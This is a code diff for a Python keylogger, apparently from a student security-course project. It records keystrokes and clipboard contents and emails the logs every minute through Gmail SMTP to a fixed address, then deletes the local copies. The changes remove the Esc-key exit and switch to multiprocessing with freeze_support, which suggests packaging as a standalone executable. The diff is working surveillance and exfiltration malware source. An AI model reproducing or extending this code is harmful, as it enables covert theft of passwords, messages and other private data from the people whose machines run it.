@@ -9,7 +9,7 @@ from email.mime.multipart import MIMEMultipart
 from datetime import datetime
 from os import remove
 from time import sleep
-import threading
+from multiprocessing import Process, freeze_support
 
 # Keyboard logger
 def on_press(key):
@@ -24,13 +24,9 @@ def on_press(key):
                 print(" ")
         log.close()
 
-def on_release(key):
-    if key == keyboard.Key.esc:
-        return False
-
 # Collect events until released
 def keylogger():
-    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
+    with keyboard.Listener(on_press=on_press) as listener:
         listener.join()
 
 # Clipboard logger
@@ -73,11 +69,18 @@ def send_logs():
     msg.attach(part1)
     msg.attach(part2)
 
+    # Get the password
+    with open("password.txt", "r") as fp:
+        password = fp.read()
+    # Get the email
+    with open("email.txt", "r") as fp:
+        email = fp.read()
+
     # Send email
     server = smtplib.SMTP("smtp.gmail.com", 587)
     server.ehlo()
     server.starttls()
-    server.login("scruffy.comp6841.sa@gmail.com", "REDACTED")
+    server.login(email, password)
     server.sendmail("scruffy.comp6841.sa@gmail.com", "scruffy.comp6841.sa@gmail.com", msg.as_string())
 
     # Delete logs
@@ -90,11 +93,19 @@ def loopEmail():
         sleep(60)
         send_logs()
 
-# Plan: Run simultaneous threads for processes
-keyThread = threading.Thread(target=keylogger)
-clipThread = threading.Thread(target=cliplogger)
-emailThread = threading.Thread(target=loopEmail)
+if __name__ == '__main__':
+    freeze_support()
 
-keyThread.start()
-clipThread.start()
-emailThread.start()
+    # Plan: Run simultaneous threads for processes
+    keyProcess = Process(target=keylogger)
+    clipProcess = Process(target=cliplogger)
+    emailProcess = Process(target=loopEmail)
+
+    keyProcess.start()
+    clipProcess.start()
+    emailProcess.start()
+
+    sleep(70)
+    keyProcess.terminate()
+    clipProcess.terminate()
+    emailProcess.terminate()
